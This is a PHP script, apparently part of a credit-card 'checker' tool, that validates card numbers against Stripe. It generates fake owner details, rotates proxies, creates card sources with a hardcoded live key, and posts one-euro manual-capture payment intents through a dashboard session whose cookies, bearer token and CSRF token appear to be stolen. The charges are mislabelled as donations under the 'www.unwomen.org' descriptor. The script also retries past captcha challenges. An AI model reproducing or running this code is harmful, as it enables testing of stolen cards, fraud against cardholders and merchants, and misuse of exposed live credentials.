<?php

$retry = 0;

$isRetry = False;

start:

if ($isRetry) {
	$retry++;

	$this->curlx->DeleteCookie();
}

if ($retry > 2) {
	if (empty($empty)) $empty = 'Maximum Retrys Reached';

	$status = ['emoji' => '❌', 'status' => 'DECLINED', 'msg' => "RETRY - $empty!"];

	goto end;
}

$isRetry = True;

$server = $this->proxy();

$fake = $this->tools->GetUser();

$cookie = uniqid();

$data = 'type=card&owner[name]='.$fake->first.'+'.$fake->last.'&owner[address][city]=NY&owner[address][country]=US&owner[address][line1]=Street+123&owner[address][state]=NY&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mm.'&card[exp_year]='.$yy.'&guid=NA&muid=NA&sid=NA&payment_user_agent=stripe.js%2F63fd7ebb3%3B+stripe-js-v3%2F63fd7ebb3%3B+dashboard&time_on_page='.rand(50000, 100000).'&key=pk_live_51Ma2zWBuE2NJRvit8AqvFJfWYPeNSHbbseCrrfpXTV11kRGK6e2umR5tsKToyyx18UtxUekIkbm8YJfOJzvEeFpR00XwqIaCty';

$headers = [
	'accept: application/json',
	'accept-language: en-US,en;q=0.9',
	'cache-control: no-cache',
	'content-type: application/x-www-form-urlencoded',
	'origin: https://js.stripe.com',
	'pragma: no-cache',
	'referer: https://js.stripe.com/',
	'sec-ch-ua: ".Not/A)Brand";v="99", "Google Chrome";v="103", "Chromium";v="103"',
	'sec-ch-ua-mobile: ?0',
	'sec-ch-ua-platform: "Windows"',
	'sec-fetch-dest: empty',
	'sec-fetch-mode: cors',
	'sec-fetch-site: same-site',
	'user-agent: '.$this->curlx->userAgent().''
];

$r1 = $this->curlx->Post('https://api.stripe.com/v1/sources', $data, $headers, $cookie, $server['proxy']);

if (!$r1->success) goto start;

$json_r1 = json_decode($r1->body);

if (isset($json_r1->error)) {
	$status = $this->response->ErrorHandler($json_r1->error);

	goto end;
}

if (!isset($json_r1->id)) goto start;

$src = $json_r1->id;

$data = 'payment_method_types%5B%5D=card&payment_method_options%5Bcard%5D%5Bmoto%5D=true&amount=100&capture_method=manual&confirm=true&currency=eur&statement_descriptor=www.unwomen.org&receipt_email='.urlencode($fake->email).'&source='.$src.'&description=Donation+to+our+company!';

$headers = [
	'accept: */*',
	'accept-language: en-US,en-US,en',
	'authorization: Bearer uk_NKmFfemWJcb2IyxMYswAYLxjHnskf9Cv00AtEIHd9s',
	'cache-control: no-cache',
	'content-type: application/x-www-form-urlencoded; charset=UTF-8',
	'cookie: machine_identifier=Az6O3hf9eqDhagmY1tMXpe4%2FqPYGoxyarjzF8%2Fe79MGsFeTBIzPz5oZtC9OQibIbDpM%3D; private_machine_identifier=R5CsKAshYEsFVAYObMXra0cuJaS%2FfKBfLrEt%2FA6PUb%2FpFu1t6lTjp3ELRRGu%2F%2FzfE%2BA%3D; cid=c3cb45ae-8da7-41fe-8a91-06b07f2debb4; __stripe_orig_props=%7B%22referrer%22%3A%22%22%2C%22landing%22%3A%22https%3A%2F%2Fdashboard.stripe.com%2F%22%7D; stripe.csrf=0_Fs09Iq6VImwB4NyY5MfJg2K_cNBRh8lGBVExdxwUTj1Fr31yGcSJaOuCwSR-0tllGZEgHQlCetUd4VY5PZUjw-AYTZVJyx6oSzT6bTgdGE5CAe6C_irub36WEh0dWV9AWxbpxfKw%3D%3D; _ga=GA1.2.2071702155.1676059882; _gid=GA1.2.596593588.1676059882; __stripe_mid=ad7b721a-338f-436d-a9c2-31aa2a663b74f7bfe9; merchant=acct_1Ma2zWBuE2NJRvit; lang=curl; user=usr_NKiQvNNqB7KEVs; __Host-session=snc_dash_1NKiQvNNqB7KEVsNKmFWiwuvClJeuBKH2iTCjvCV37ObM3U00R5mJNMjJOYaBv-asq4KjF2-w1_UGeM-tq9JfPTgGE4U; site-auth=1; handoff=80Roi9LyDTVMcfmQue9D; site_sid=dafb017c-65d1-4658-8ea7-5b217abdf522',
	'dnt: 1',
	'origin: https://dashboard.stripe.com',
	'pragma: no-cache',
	'referer: https://dashboard.stripe.com/payments/new',
	'sec-ch-ua: "Google Chrome";v="107", "Chromium";v="107", "Not=A?Brand";v="24"',
	'sec-ch-ua-mobile: ?0',
	'sec-ch-ua-platform: "Windows"',
	'sec-fetch-dest: empty',
	'sec-fetch-mode: cors',
	'sec-fetch-site: same-origin',
	'stripe-account: acct_1Ma2zWBuE2NJRvit',
	'stripe-livemode: true',
	'stripe-version: 2022-08-01',
	'user-agent: '.$this->curlx->userAgent().'',
	'x-page-load-id: a655d24a-18af-44fd-8544-20d87451a53c',
	'x-requested-with: XMLHttpRequest',
	'x-stripe-csrf-token: EEHREVB5mOei5zgaIiDG-WDWuzRnRDE6ekT-TI3hJY10oL4-nSTyHRjPnU3ntZHNoyVx9Z8j9QreGeOt-vqrqDw-AYTZVJy8bjv6_oecSRZmxXAVYi1679LGvm0-LJZvxjqWeE3I_g==',
	'x-stripe-manage-client-revision: 1f930037cd3464579d6ca40797006862bd52ed62'
];

$r2 = $this->curlx->Post('https://dashboard.stripe.com/v1/payment_intents', $data, $headers, $cookie, $server['proxy']);

if (!$r2->success) goto start;

if (strpos($r2->body, 'verify_challenge') !== false) {
	$empty = 'Second Request Contains HCaptcha!';

	goto start;
}

$json_r2 = json_decode($r2->body);

if (isset($json_r2->error)) {
	$status = $this->response->ErrorHandler($json_r2->error);

	goto end;
}

file_put_contents('strb_r2_no_err.txt', $r2->body . PHP_EOL, FILE_APPEND);

$status = $this->response->Stripe($r2->body);

end: